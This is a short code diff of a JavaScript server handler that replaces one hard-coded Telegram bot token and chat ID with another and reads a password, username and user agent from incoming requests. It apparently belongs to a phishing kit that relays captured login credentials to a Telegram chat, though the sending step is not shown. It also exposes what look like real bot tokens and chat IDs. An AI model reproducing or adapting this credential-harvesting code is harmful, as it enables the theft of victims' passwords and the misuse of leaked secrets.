@@ -4,8 +4,8 @@ module.exports = async function handler(req, res) {
   }
 
   console.log('bammmmmmmmm')
-  const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
-  const chatId = '-5263210542';
+  const token = '7689579621:AAE5d9HHm6Jpn-aIwX8GVZz8AYtNPKg7sA0';
+  const chatId = '-1003715904743';
 
   try {
     const { pass,username, agent } = req.body;
